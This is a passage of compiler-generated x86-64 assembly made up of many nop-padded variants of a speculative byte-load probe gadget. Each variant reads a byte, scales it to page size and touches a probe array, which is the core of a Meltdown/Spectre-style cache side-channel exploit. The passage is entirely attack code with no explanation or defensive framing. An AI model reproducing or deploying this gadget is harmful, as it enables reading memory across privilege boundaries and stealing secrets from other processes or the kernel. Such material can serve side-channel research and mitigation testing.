	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 146
.Lprobe_one_win0_var146:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 147
.Lprobe_one_win0_var147:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 148
.Lprobe_one_win0_var148:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 149
.Lprobe_one_win0_var149:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 150
.Lprobe_one_win0_var150:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 151
.Lprobe_one_win0_var151:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 152
.Lprobe_one_win0_var152:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 153
.Lprobe_one_win0_var153:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 154
.Lprobe_one_win0_var154:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 155
.Lprobe_one_win0_var155:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 156
.Lprobe_one_win0_var156:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 157
.Lprobe_one_win0_var157:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 158
.Lprobe_one_win0_var158:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 159
.Lprobe_one_win0_var159:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 160
.Lprobe_one_win0_var160:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 161
.Lprobe_one_win0_var161:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 162
.Lprobe_one_win0_var162:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 163
.Lprobe_one_win0_var163:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 164
.Lprobe_one_win0_var164:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 165
.Lprobe_one_win0_var165:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 166
.Lprobe_one_win0_var166:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 167
.Lprobe_one_win0_var167:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 168
.Lprobe_one_win0_var168:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 169
.Lprobe_one_win0_var169:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 170
.Lprobe_one_win0_var170:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 171
.Lprobe_one_win0_var171:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 172
.Lprobe_one_win0_var172:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 173
.Lprobe_one_win0_var173:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 174
.Lprobe_one_win0_var174:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 175
.Lprobe_one_win0_var175:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 176
.Lprobe_one_win0_var176:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 177
.Lprobe_one_win0_var177:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 178
.Lprobe_one_win0_var178:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 179
.Lprobe_one_win0_var179:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 180
.Lprobe_one_win0_var180:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 181
.Lprobe_one_win0_var181:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 182
.Lprobe_one_win0_var182:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 183
.Lprobe_one_win0_var183:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 184
.Lprobe_one_win0_var184:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 185
.Lprobe_one_win0_var185:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 186
.Lprobe_one_win0_var186:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 187
.Lprobe_one_win0_var187:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 188
.Lprobe_one_win0_var188:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 189
.Lprobe_one_win0_var189:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 190
.Lprobe_one_win0_var190:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 191
.Lprobe_one_win0_var191:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 192
.Lprobe_one_win0_var192:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 193
.Lprobe_one_win0_var193:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 194
.Lprobe_one_win0_var194:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 195
.Lprobe_one_win0_var195:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 196
.Lprobe_one_win0_var196:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 197
.Lprobe_one_win0_var197:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 198
.Lprobe_one_win0_var198:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 199
.Lprobe_one_win0_var199:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 200
.Lprobe_one_win0_var200:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 201
.Lprobe_one_win0_var201:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 202
.Lprobe_one_win0_var202:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 203
.Lprobe_one_win0_var203:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 204
.Lprobe_one_win0_var204:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 205
.Lprobe_one_win0_var205:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 206
.Lprobe_one_win0_var206:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 207
.Lprobe_one_win0_var207:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 208
.Lprobe_one_win0_var208:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 209
.Lprobe_one_win0_var209:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 210
.Lprobe_one_win0_var210:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 211
.Lprobe_one_win0_var211:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 212
.Lprobe_one_win0_var212:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 213
.Lprobe_one_win0_var213:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 214
.Lprobe_one_win0_var214:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 215
.Lprobe_one_win0_var215:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 216
.Lprobe_one_win0_var216:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 217
.Lprobe_one_win0_var217:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 218
.Lprobe_one_win0_var218:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 219
.Lprobe_one_win0_var219:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 220
.Lprobe_one_win0_var220:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 221
.Lprobe_one_win0_var221:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 222
.Lprobe_one_win0_var222:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 223
.Lprobe_one_win0_var223:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 224
.Lprobe_one_win0_var224:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 225
.Lprobe_one_win0_var225:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 226
.Lprobe_one_win0_var226:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 227
.Lprobe_one_win0_var227:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 228
.Lprobe_one_win0_var228:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 229
.Lprobe_one_win0_var229:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 230
.Lprobe_one_win0_var230:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 231
.Lprobe_one_win0_var231:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 232
.Lprobe_one_win0_var232:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 233
.Lprobe_one_win0_var233:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 234
.Lprobe_one_win0_var234:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 235
.Lprobe_one_win0_var235:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	nop
	nop
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 236
.Lprobe_one_win0_var236:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 237
.Lprobe_one_win0_var237:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 238
.Lprobe_one_win0_var238:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 239
.Lprobe_one_win0_var239:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 240
.Lprobe_one_win0_var240:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 241
.Lprobe_one_win0_var241:
	popq	%rax
	addq	$32, %rsp
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 242
.Lprobe_one_win0_var242:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	nop
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 243
.Lprobe_one_win0_var243:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	nop
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 244
.Lprobe_one_win0_var244:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	nop
	nop
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 245
.Lprobe_one_win0_var245:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	jz	92b
	nop
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 246
.Lprobe_one_win0_var246:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	shlq	$0xc, %rax
	nop
	nop
	nop
	jz	92b
	nop
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 247
.Lprobe_one_win0_var247:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	nop
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 248
.Lprobe_one_win0_var248:
	popq	%rax
	addq	$32, %rsp
	nop
	nop
	nop
	nop
	nop
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	jmp	.Lprobe_one_win0_continue
## Variant 249
.Lprobe_one_win0_var249:
	popq	%rax
	addq	$32, %rsp
	movb	(%rdx), %al
	nop
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	nop
	nop
	nop
	nop
	nop
	jmp	.Lprobe_one_win0_continue
.Lprobe_one_win0_continue:
__speculative_byte_load_exit:
	nop
# 0 "" 2
#NO_APP
	movl	$0, -2388(%rbp)
	jmp	.L6
.L8:
